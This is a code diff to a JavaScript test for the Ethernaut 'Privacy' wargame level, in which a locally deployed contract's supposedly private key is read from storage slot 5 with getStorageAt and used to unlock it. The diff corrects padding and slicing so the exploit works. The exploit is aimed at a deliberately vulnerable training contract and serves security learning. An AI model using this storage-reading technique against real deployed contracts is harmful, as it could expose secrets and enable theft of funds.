@@ -244,13 +244,13 @@ contract("Ethernaut", (accounts) => {
 		});
 		it("Exploit", async () => {
 			const contract = await Privacy.new([ // bytes32 array is stored in the contract storage which is public
-				web3.utils.padLeft(web3.utils.asciiToHex("ether"), 64), // 32 bytes = 64 length / 2 hex chars
-				web3.utils.padLeft(web3.utils.asciiToHex("naut"), 64),
-				web3.utils.padLeft(web3.utils.asciiToHex("12"), 64) // this is the key we need
+				web3.utils.padRight(web3.utils.asciiToHex("ether"), 64), // 32 bytes = 64 length / 2 hex chars
+				web3.utils.padRight(web3.utils.asciiToHex("naut"), 64),
+				web3.utils.padRight(web3.utils.asciiToHex("12"), 64) // this is the key we need
 			]);
 			// contract storage consists of multiple 32-byte slots where smaller values are grouped together to fit into one slot
 			const key = await web3.eth.getStorageAt(contract.address, 5); // retrieve the key from the contract storage
-			await contract.unlock(key.substring(0, 32)); // convert / trim the key to bytes16 value
+			await contract.unlock(key.slice(0, 34)); // convert / trim the key to bytes16 value
 			const lockedCurrent = await contract.locked();
 			assert(!lockedCurrent, "Failed to pass level 12."); // unlock to pass the level
 		});
